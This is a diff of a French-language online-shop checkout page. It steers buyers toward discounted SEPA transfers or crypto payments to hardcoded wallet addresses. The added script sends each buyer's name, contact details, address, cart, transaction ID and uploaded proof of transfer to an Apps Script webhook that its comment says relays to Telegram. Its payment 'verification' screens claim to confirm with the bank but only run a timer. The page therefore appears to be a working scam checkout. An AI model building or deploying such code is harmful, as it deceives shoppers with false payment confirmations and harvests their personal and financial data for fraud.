@@ -69,7 +69,7 @@
     .disabled{opacity:.5;cursor:not-allowed}
     .disabled .bubble{display:none}
 
-    /* Highlight best: centered RIGHT */
+    /* Highlight best */
     .m.best::after{
       content:"MEILLEUR TARIF";
       position:absolute; top:50%; right:12px; transform:translateY(-50%);
@@ -158,7 +158,7 @@
       min-width:48px; text-align:center;
     }
 
-    /* Full-screen overlays */
+    /* Full-screen overlays (verification + success) */
     .overlay{
       position:fixed; inset:0; display:none; align-items:center; justify-content:center;
       background:rgba(15,23,42,.28); backdrop-filter:blur(6px);
@@ -238,7 +238,6 @@
         </div>
 
         <div class="methods" role="tablist">
-          <!-- VIREMENT EN PREMIER + avantage -->
           <button class="m best" role="tab" aria-selected="true" data-method="sepa">
             <div class="mlabel"><strong>Virement SEPA</strong></div>
             <div class="logos">
@@ -248,7 +247,6 @@
             <span class="bubble">Promo -3%</span>
           </button>
 
-          <!-- Crypto ensuite -->
           <button class="m" role="tab" aria-selected="false" data-method="crypto">
             <div class="mlabel"><strong>Crypto</strong></div>
             <div class="logos">
@@ -286,7 +284,7 @@
           </button>
         </div>
 
-        <!-- Panneau SEPA (par défaut) -->
+        <!-- Panneau SEPA -->
         <div id="pmSEPA" class="pm show">
           <div class="row">
             <div class="row cols-2">
@@ -482,12 +480,9 @@
   </footer>
 
   <script>
-  (()=>{
-    // ——————————— CONFIG
+  (async()=>{
+    // ——— CONFIG WEBHOOK APPS SCRIPT (→ Telegram) ———
     const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
-    const CART_KEY = "gf_cart";
-    const ORDERS_KEY = "gf_orders";
-    const SHIPPING = 0;
 
     // Icônes
     const ICONS = {
@@ -498,14 +493,60 @@
       truck:'https://img.icons8.com/?size=100&id=plGFB4oatud2&format=png&color=000000',
       back:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000'
     };
+    const setSrc=(id,src)=>{const el=document.getElementById(id); if(el) el.src=src};
+    setSrc('icUser',ICONS.user); setSrc('icMenu',ICONS.menu); setSrc('icSSL',ICONS.ssl);
+    setSrc('icTruck',ICONS.truck); setSrc('icBack',ICONS.back); setSrc('icContinue',ICONS.continue);
 
-    // FX + wallets (affichage crypto)
-    const FX={
+    // Menu
+    const menuBtn=document.getElementById('menuBtn'), menuDrop=document.getElementById('menuDrop');
+    if(menuBtn&&menuDrop){
+      menuBtn.addEventListener('click',e=>{e.stopPropagation();menuDrop.classList.toggle('show')});
+      document.addEventListener('click',e=>{ if(!menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });
+    }
+
+    // Helpers
+    const $=s=>document.querySelector(s); const $$=s=>Array.from(document.querySelectorAll(s));
+    const toast=msg=>{const t=$('#toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1600);};
+    const EUR=v=>Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
+
+    // Panier localStorage (clé identique au site)
+    const KEY='gf_cart';
+    const getCart=()=>{try{return JSON.parse(localStorage.getItem(KEY)||'[]')}catch{return[]}};
+    const setCart=arr=>localStorage.setItem(KEY,JSON.stringify(arr));
+
+    // ID commande visible
+    const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
+    $('#orderId').textContent=orderId;
+
+    // Rendu mini panier (colonne droite)
+    function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
+    function renderMini(){
+      const wrap=$('#miniCart'); const cart=getCart();
+      if(!cart.length){ wrap.innerHTML='<div class="muted">Votre panier est vide.</div>'; $('#sub').textContent='—'; $('#benefit').textContent='—'; $('#total').textContent='—'; $('#dueNow').textContent='—'; $('#schedule').style.display='none'; return; }
+      wrap.innerHTML=cart.map(x=>`
+        <div class="ci">
+          <img src="${x.image||''}" alt="${x.name||''}">
+          <div>
+            <div style="font-weight:600">${x.name||''}</div>
+            <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
+          </div>
+          <div style="font-weight:600">${EUR(Number(x.price||0)*Number(x.qty||1))}</div>
+        </div>`).join('');
+    }
+
+    // Méthodes / promos
+    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
+    function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
+
+    // Taux mock (affichage montant crypto)
+    const fx={
       'USDT-TRC20':{symbol:'USDT',rate:1},
       'USDT-BEP20':{symbol:'USDT',rate:1},
       'BTC':{symbol:'BTC',rate:60000},
       'ETH-ERC20':{symbol:'ETH',rate:3000}
     };
+
+    // Adresses crypto + QR
     const WALLET={
       'USDT-BEP20':{
         address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
@@ -525,21 +566,14 @@
       }
     };
 
-    // ——————————— HELPERS
-    const $=s=>document.querySelector(s); const $$=s=>Array.from(document.querySelectorAll(s));
-    const EUR=v=>Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
-    const toast=msg=>{const t=$('#toast'); if(!t) return; t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1600);};
-    const getCart=()=>{try{return JSON.parse(localStorage.getItem(CART_KEY)||'[]')}catch{return[]}};
-    const setCart=arr=>localStorage.setItem(CART_KEY,JSON.stringify(arr));
-    const getOrders=()=>{try{return JSON.parse(localStorage.getItem(ORDERS_KEY)||'[]')}catch{return[]}};
-    const setOrders=arr=>localStorage.setItem(ORDERS_KEY,JSON.stringify(arr));
+    function setCryptoAddress(ccy){
+      const cfg=WALLET[ccy];
+      $('#wallet').value = cfg?.address || '';
+      $('#ccyLabel').textContent = fx[ccy]?.symbol || (ccy.includes('USDT')?'USDT':'');
+      const img=$('#qrImg'); if(img){ img.src = cfg?.qr || ''; img.alt = 'QR '+ccy; }
+    }
 
-    const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
-    const setSrc=(id,src)=>{const el=document.getElementById(id); if(el) el.src=src};
-
-    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
-    function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
-    function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
+    // Échéancier
     function splitAmounts(total, parts){
       const cents=Math.round(total*100);
       const base=Math.floor(cents/parts);
@@ -556,80 +590,45 @@
         return {label,date:d.toLocaleDateString('fr-FR'),amt};
       });
     }
-    function getShipping(){
-      return {
-        name:$('#name').value, email:$('#email').value, phone:$('#phone').value,
-        address:$('#address').value, city:$('#city').value, zip:$('#zip').value, country:$('#country').value
-      };
+
+    // Split
+    let selectedSplit=1; let modalParts=4;
+    const modal=$('#splitModal');
+    const openModal=()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); };
+    const closeModal=()=>{ modal.classList.remove('show'); modal.setAttribute('aria-hidden','true'); };
+    function updateSplitHint(){ $('#splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× mensuel)` : '(désactivé)'; }
+    function updateModalPreview(){
+      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0,sub - promo);
+      const lines=scheduleLines(total, modalParts);
+      $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
     }
-    function computeTotals(){
-      const cart=getCart();
-      const sub=computeSub(cart);
-      const promo=sub*promoRate();
-      const total=Math.max(0, sub + SHIPPING - promo);
-      return {sub,promo,total};
+    function setModalParts(n){
+      modalParts=Number(n);
+      $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===modalParts)));
+      updateModalPreview();
     }
+    $$('#segSplit .segbtn').forEach(b=>b.addEventListener('click',()=>setModalParts(b.dataset.parts)));
+    $('#closeSplit').addEventListener('click',closeModal);
+    $('#cancelSplit').addEventListener('click',closeModal);
+    $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
 
-    // overlays
-    const overlay = ()=>document.getElementById('checkOverlay');
-    const showOverlay=(title,sub)=>{const t=document.getElementById('ovTitle'); const s=document.getElementById('ovSub'); if(t) t.textContent=title||'Vérification…'; if(s) s.textContent=sub||'Un instant, nous confirmons votre paiement.'; overlay().classList.add('show'); overlay().setAttribute('aria-hidden','false');};
-    const hideOverlay=()=>{overlay().classList.remove('show'); overlay().setAttribute('aria-hidden','true');};
-    const showDone=()=>{const d=document.getElementById('doneOverlay'); d.classList.add('show'); d.setAttribute('aria-hidden','false');};
-
-    // ——————————— STATE
-    let selectedSplit=1, modalParts=4;
-    let bankVerified=false, cryptoVerified=false;
-    let proofFile=null;
-
-    // ——————————— UI init
-    setSrc('icUser',ICONS.user); setSrc('icMenu',ICONS.menu); setSrc('icSSL',ICONS.ssl);
-    setSrc('icTruck',ICONS.truck); setSrc('icBack',ICONS.back); setSrc('icContinue',ICONS.continue);
-    if($('#orderId')) $('#orderId').textContent=orderId;
-
-    // Menu
-    const menuBtn=document.getElementById('menuBtn'), menuDrop=document.getElementById('menuDrop');
-    if(menuBtn&&menuDrop){
-      menuBtn.addEventListener('click',e=>{e.stopPropagation();menuDrop.classList.toggle('show')});
-      document.addEventListener('click',e=>{ if(!menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });
-    }
-
-    // Rendu mini-cart
-    function renderMini(){
-      const wrap=$('#miniCart'); const cart=getCart();
-      if(!wrap) return;
-      if(!cart.length){ wrap.innerHTML='<div class="muted">Votre panier est vide.</div>'; $('#sub').textContent='—'; $('#benefit').textContent='—'; $('#total').textContent='—'; $('#dueNow').textContent='—'; $('#schedule').style.display='none'; return; }
-      wrap.innerHTML=cart.map(x=>`
-        <div class="ci">
-          <img src="${x.image||''}" alt="${x.name||''}">
-          <div>
-            <div style="font-weight:600">${x.name||''}</div>
-            <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
-          </div>
-          <div style="font-weight:600">${EUR(Number(x.price||0)*Number(x.qty||1))}</div>
-        </div>`).join('');
-    }
-
-    // Crypto address + QR
-    function setCryptoAddress(ccy){
-      const cfg=WALLET[ccy];
-      $('#wallet').value = cfg?.address || '';
-      $('#ccyLabel').textContent = FX[ccy]?.symbol || (ccy?.includes('USDT')?'USDT':'');
-      const img=$('#qrImg'); if(img){ img.src = cfg?.qr || ''; img.alt = 'QR '+ccy; }
-    }
-
-    // Référence SEPA auto
+    // Référence courte basée sur le nom
     const slugRefFromName = (n)=>{
       const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
       if(base) return base;
       const short=orderId.replace('GF-','').split('-')[0];
       return 'GF'+short;
     };
-    const syncRef=()=>{ const name=$('#name')?.value||''; const ref=slugRefFromName(name); const v=$('#vref'); if(v) v.value=ref; };
+    const syncRef=()=>{ const name=$('#name')?.value||''; $('#vref').value=slugRefFromName(name); };
+    $('#name').addEventListener('input', syncRef);
 
-    // Summary
+    // Récap global
+    const SHIPPING=0;
     function updateSummary(){
       const cart=getCart(); if(!cart.length){ renderMini(); return; }
-      const {sub,promo,total}=computeTotals();
+      const sub=computeSub(cart);
+      const promo=sub*promoRate();
+      const total=Math.max(0, sub + SHIPPING - promo);
       const parts = selectedSplit;
       const amts=splitAmounts(total,parts);
       const dueNow=amts[0];
@@ -650,7 +649,7 @@
 
       if(currentPM()==='crypto'){
         $('#amountNow').value = dueNow.toFixed(2);
-        const ccy=$('#ccy').value; const r=FX[ccy]?.rate||1;
+        const ccy=$('#ccy').value; const r=fx[ccy]?.rate||1;
         const amt=(dueNow/r);
         $('#ccyAmt').value = (amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
       }
@@ -658,7 +657,27 @@
         $('#amountNowBank').value = dueNow.toFixed(2);
       }
     }
-    function updateSplitHint(){ $('#splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× mensuel)` : '(désactivé)'; }
+    function currentDueNow(){
+      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
+      return splitAmounts(total, selectedSplit)[0]||0;
+    }
+
+    // Overlays
+    const overlay = document.getElementById('checkOverlay');
+    const ovTitle = document.getElementById('ovTitle');
+    const ovSub = document.getElementById('ovSub');
+    const showOverlay = (title, sub) => {
+      ovTitle.textContent = title || 'Vérification…';
+      ovSub.textContent = sub || 'Un instant, nous confirmons votre paiement.';
+      overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false');
+    };
+    const hideOverlay = () => { overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); };
+
+    const doneOverlay = document.getElementById('doneOverlay');
+    const showDone = () => { doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); };
+
+    // États de vérification
+    let bankVerified=false, cryptoVerified=false;
 
     function updateCTA(){
       const pm=currentPM();
@@ -666,10 +685,99 @@
       btn.disabled = (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : false);
     }
 
-    // Init affichage
+    // ---------- ENVOI WEBHOOK COMPATIBLE (JSON + QS alias) ----------
+    // — alias legacy pour Apps Script lisant e.parameter
+    function legacyMap(payload){
+      return {
+        order: payload.orderId,
+        mode: payload.method,
+        amount: payload.amount,
+        reference: payload.ref || payload.txid || '',
+        name: payload.name,
+        email: payload.email,
+        phone: payload.phone,
+        address: payload.address,
+        city: payload.city,
+        zip: payload.zip,
+        country: payload.country,
+        txid: payload.txid || '',
+        ccy: payload.ccy || ''
+      };
+    }
+    function toQS(obj){
+      return Object.entries(obj)
+        .filter(([k,v])=> v!==undefined && v!==null && String(v).length<1800)
+        .map(([k,v])=> `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
+        .join('&');
+    }
+    async function postCompat(url, payload){
+      const qs = toQS(legacyMap(payload));
+      const full = qs ? `${url}?${qs}` : url;
+      // 1) JSON direct
+      try{
+        await fetch(full, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+        return;
+      }catch{}
+      // 2) FormData (_json)
+      try{
+        const fd = new FormData(); fd.append('_json', JSON.stringify(payload));
+        await fetch(full, { method:'POST', body: fd });
+        return;
+      }catch{}
+      // 3) no-cors fallback (simple content-type)
+      try{
+        await fetch(full, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body: JSON.stringify(payload) });
+      }catch{}
+    }
+    function cartForWebhook(){
+      try{
+        const cart = JSON.parse(localStorage.getItem('gf_cart')||'[]');
+        return cart.map(x=>({name:x.name, qty:Number(x.qty||1), price:Number(x.price||0)}));
+      }catch{ return []; }
+    }
+    async function fileToBase64(file){
+      const buf = await file.arrayBuffer();
+      let binary=''; const bytes=new Uint8Array(buf); const chunk=0x8000;
+      for(let i=0;i<bytes.length;i+=chunk){ binary += String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
+      return btoa(binary);
+    }
+    async function sendCryptoToWebhook(dueNow){
+      const payload = {
+        orderId,
+        method:'crypto',
+        amount: Number(dueNow||0).toFixed(2),
+        txid: $('#txid').value.trim(),
+        ccy: $('#ccy').value,
+        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
+        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
+        cart: cartForWebhook(),
+        ts_client: new Date().toISOString()
+      };
+      await postCompat(WEBHOOK_URL, payload);
+    }
+    async function sendSepaToWebhook(dueNow, proofFile){
+      const payload = {
+        orderId,
+        method:'sepa',
+        amount: Number(dueNow||0).toFixed(2),
+        ref: $('#vref').value.trim(),
+        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
+        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
+        cart: cartForWebhook(),
+        ts_client: new Date().toISOString()
+      };
+      if(proofFile){
+        payload.file_name = proofFile.name;
+        payload.mime_type = proofFile.type || 'application/octet-stream';
+        payload.file_b64 = await fileToBase64(proofFile);
+      }
+      await postCompat(WEBHOOK_URL, payload);
+    }
+
+    // Init affichages
     renderMini(); updateSummary(); updateSplitHint(); setCryptoAddress($('#ccy').value); syncRef(); updateCTA();
 
-    // Tabs méthodes
+    // Interactions tab méthodes
     $$('.m[role="tab"]').forEach(card=>{
       card.addEventListener('click', ()=>{
         $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
@@ -683,28 +791,9 @@
       });
     });
 
-    // Split toggle & modal
-    const modal=$('#splitModal');
-    const openModal=()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); };
-    const closeModal=()=>{ modal.classList.remove('show'); modal.setAttribute('aria-hidden','true'); };
-    function updateModalPreview(){
-      const {sub,promo}=computeTotals();
-      const total=Math.max(0,sub - promo);
-      const lines=scheduleLines(total, modalParts);
-      $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
-    }
-    function setModalParts(n){
-      modalParts=Number(n);
-      $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===modalParts)));
-      updateModalPreview();
-    }
+    // Split toggle
     $('#btnOnce').addEventListener('click',()=>{ selectedSplit=1; $('#btnOnce').classList.add('on'); $('#btnSplit').classList.remove('on'); updateSplitHint(); updateSummary(); });
-    $('#btnSplit').addEventListener('click',openModal);
-    $('#closeSplit').addEventListener('click',closeModal);
-    $('#cancelSplit').addEventListener('click',closeModal);
-    $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
-    $$('#segSplit .segbtn').forEach(b=>b.addEventListener('click',()=>setModalParts(b.dataset.parts)));
-    $('#splitModal').addEventListener('click',e=>{ if(e.target.id==='splitModal') closeModal(); });
+    $('#btnSplit').addEventListener('click',()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); });
 
     // Crypto change
     $('#ccy').addEventListener('change', ()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
@@ -743,6 +832,7 @@
       });
     }
     function fmtBytes(b){ if(!b&&b!==0) return ''; const u=['o','Ko','Mo','Go']; let i=0; while(b>=1024 && i<u.length-1){ b/=1024; i++; } return b.toFixed(b<10&&i?1:0)+' '+u[i]; }
+    let proofFile=null;
     function showFile(f){
       proofFile=f;
       fileName.textContent=f.name;
@@ -759,82 +849,14 @@
       showFile(f);
     });
 
-    // ——————————— Webhook helpers
-    async function fileToBase64(file){
-      const buf = await file.arrayBuffer();
-      let binary = '';
-      const bytes = new Uint8Array(buf);
-      const chunkSize = 0x8000;
-      for(let i=0;i<bytes.length;i+=chunkSize){
-        const sub = bytes.subarray(i, i+chunkSize);
-        binary += String.fromCharCode.apply(null, sub);
-      }
-      return btoa(binary); // sans préfixe data:
-    }
-    async function postJSON(url, payload){
-      try{
-        const r = await fetch(url, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(payload)
-        });
-        // si CORS bloque, on tombera dans catch; sinon on ignore la réponse
-        return true;
-      }catch(e){
-        // fallback no-cors (fire-and-forget)
-        try{
-          await fetch(url, { method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-        }catch(_){}
-        return false;
-      }
-    }
-    function cartForWebhook(){
-      const cart=getCart();
-      return cart.map(x=>({name:x.name, qty:Number(x.qty||1), price:Number(x.price||0)}));
-    }
-    async function sendCryptoToWebhook(dueNow){
-      const payload = {
-        orderId,
-        method:'crypto',
-        ccy: $('#ccy').value,
-        amount: String(dueNow.toFixed(2)),
-        txid: $('#txid').value.trim(),
-        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
-        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
-        cart: cartForWebhook()
-      };
-      await postJSON(WEBHOOK_URL, payload);
-    }
-    async function sendSepaToWebhook(dueNow){
-      const payload = {
-        orderId,
-        method:'sepa',
-        amount: String(dueNow.toFixed(2)),
-        ref: $('#vref').value.trim(),
-        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
-        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
-        cart: cartForWebhook()
-      };
-      if(proofFile){
-        payload.file_name = proofFile.name;
-        payload.mime_type = proofFile.type || 'application/octet-stream';
-        payload.file_b64 = await fileToBase64(proofFile);
-      }
-      await postJSON(WEBHOOK_URL, payload);
-    }
-
-    // ——————————— Confirmations
+    // Confirmer crypto : vérifie + ENVOIE au webhook
     document.getElementById('confirmCrypto').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       const tx = document.getElementById('txid').value.trim();
       if(!tx){ document.getElementById('txid').focus(); toast('TxID requis.'); return; }
       showOverlay('Vérification de la transaction crypto…', 'Nous validons le hash fourni.');
-
-      const {sub,promo}=computeTotals(); const total=Math.max(0,sub - promo);
-      const dueNow = splitAmounts(total, selectedSplit)[0];
-
-      await sendCryptoToWebhook(dueNow);
-
+      const dueNow = currentDueNow();
+      try{ await sendCryptoToWebhook(dueNow); }catch{}
       setTimeout(()=>{
         hideOverlay();
         cryptoVerified=true;
@@ -844,17 +866,14 @@
       }, 1200);
     });
 
+    // Confirmer SEPA : vérifie + ENVOIE au webhook (avec pièce jointe)
     document.getElementById('confirmBank').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       if(!$('#vref').value.trim()){ syncRef(); }
       if(!proofFile){ dz.scrollIntoView({behavior:'smooth',block:'center'}); toast('Preuve de virement requise.'); return; }
       showOverlay('Vérification du virement…', 'Nous confirmons la réception auprès de la banque.');
-
-      const {sub,promo}=computeTotals(); const total=Math.max(0,sub - promo);
-      const dueNow = splitAmounts(total, selectedSplit)[0];
-
-      await sendSepaToWebhook(dueNow);
-
+      const dueNow = currentDueNow();
+      try{ await sendSepaToWebhook(dueNow, proofFile); }catch{}
       setTimeout(()=>{
         hideOverlay();
         bankVerified=true;
@@ -864,7 +883,7 @@
       }, 1300);
     });
 
-    // ——————————— Finaliser
+    // Finaliser la commande (stocke côté client + écran succès)
     document.getElementById('placeOrder').addEventListener('click', ()=>{
       if(!validateAddress()) return;
       const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
@@ -872,11 +891,11 @@
       if(pm==='crypto' && !cryptoVerified){ toast('Veuillez terminer la vérification crypto.'); return; }
       if(pm==='sepa' && !bankVerified){ toast('Veuillez terminer la vérification du virement.'); return; }
 
-      const {sub,promo,total}=computeTotals();
+      const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
       const order={
         id:orderId, date:new Date().toISOString(), status:'En préparation',
         items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
-        shipping:getShipping(),
+        shipping:{name:$('#name').value,email:$('#email').value,phone:$('#phone').value,address:$('#address').value,city:$('#city').value,zip:$('#zip').value,country:$('#country').value},
         payment:{
           method:pm, split:selectedSplit,
           details: pm==='crypto'
@@ -884,15 +903,18 @@
             : {iban:$('#iban').value,ref:$('#vref').value,amountNow:$('#amountNowBank').value,proofName:proofFile?.name||''}
         }
       };
-      try{ const all=getOrders(); all.push(order); setOrders(all); }catch{}
+      try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
+
       setCart([]);
       showDone();
     });
 
-    // ——————————— Events divers
-    $('#name').addEventListener('input', syncRef);
-    $('#ccy').addEventListener('change', ()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
+    // Fermer modal en cliquant le fond
+    document.getElementById('splitModal').addEventListener('click',e=>{ if(e.target.id==='splitModal') e.currentTarget.classList.remove('show'); });
 
+    // Init
+    renderMini();
+    updateSummary();
   })();
   </script>
 </body>
